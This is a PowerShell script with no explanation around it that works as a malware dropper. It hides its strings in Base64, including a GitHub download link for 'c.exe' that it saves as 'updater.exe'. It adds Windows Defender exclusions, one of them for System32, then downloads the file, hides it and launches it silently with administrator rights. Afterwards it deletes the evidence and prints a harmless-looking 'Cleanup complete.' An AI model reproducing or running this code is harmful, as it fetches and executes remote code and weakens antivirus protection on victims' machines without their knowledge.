$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL0FtYmF0dWthbWhhY2tlci9sMjMvcmF3L21haW4vYy5leGU="
$updaterExeB64 = "dXBkYXRlci5leGU="
$silentlyContinueB64 = "U2lsZW50bHlDb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="

$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
    } catch {}
}

function Remove-Exclusion {
    param ([string]$Path)
    try {
        $exclusions = (Get-MpPreference).ExclusionPath
        if ($exclusions -contains $Path) {
            Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
        }
    } catch {}
}

Add-Exclusion -Path "C:\Windows\System32"

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
$tempPath = Join-Path $hiddenFolder $updaterExe

try {
    New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
    Add-Exclusion -Path $hiddenFolder

    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    (Get-Item $hiddenFolder).Attributes += 'Hidden'
    (Get-Item $tempPath).Attributes += 'Hidden'

    $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -PassThru
    Start-Sleep -Seconds 5

    $exeName = [System.IO.Path]::GetFileName($tempPath).ToLower()
    Get-CimInstance Win32_Process | Where-Object {
        ($_.Name -ieq $exeName) -and ($_.ExecutablePath -like "$hiddenFolder\*")
    } | ForEach-Object {
        try {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        } catch {}
    }

    $maxAttempts = 10
    $attempt = 0
    while ((Test-Path $hiddenFolder) -and ($attempt -lt $maxAttempts)) {
        try {
            Remove-Item $hiddenFolder -Recurse -Force -ErrorAction Stop
        } catch {}
        Start-Sleep -Milliseconds 500
        $attempt++
    }

    Remove-Exclusion -Path $hiddenFolder
}
catch {
    exit 1
}

Write-Host "Cleanup complete."
